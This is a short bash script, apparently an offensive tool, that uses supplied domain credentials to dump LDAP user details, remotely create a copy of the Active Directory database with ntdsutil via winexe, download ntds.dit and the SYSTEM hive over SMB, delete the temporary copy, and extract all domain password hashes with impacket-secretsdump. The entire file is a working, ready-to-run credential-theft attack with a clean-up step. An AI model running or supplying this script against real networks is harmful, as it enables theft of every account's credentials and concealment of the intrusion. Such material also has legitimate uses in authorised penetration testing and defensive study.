#!/usr/bin/bash

# $1=username $2=password $3=domain name
# yes I know it's very ugly

IP=$(host $3 | grep "has address" | head -n1 | cut -d ' ' -f 4)
echo "we will use user: $1 with password: $2 on domain: $3"
echo "getting users details..."
ldapdomaindump -u $3\\$1 -p $2 --no-html --no-json ldap://$IP:389
echo "done, creating ntds.dit..."
winexe -U $1%$2 //$IP 'cmd.exe /c ntdsutil "ac i ntds" "ifm" "create full c:\temp\robb" q q'
echo "done, downloading it..."
smbclient -U $1%$2 \\\\$IP\\'C$' -c 'get "temp\robb\Active Directory\ntds.dit" ntds.dit'
smbclient -U $1%$2 \\\\$IP\\'C$' -c 'get temp\robb\registry\SYSTEM SYSTEM'
echo "done, cleanning up..."
winexe -U $1%$2 //$IP 'cmd.exe /c rmdir /S /q c:\temp\robb'
echo "extracting hashes"
impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL > hashes.txt
echo "hashes extracted to hashes.txt"
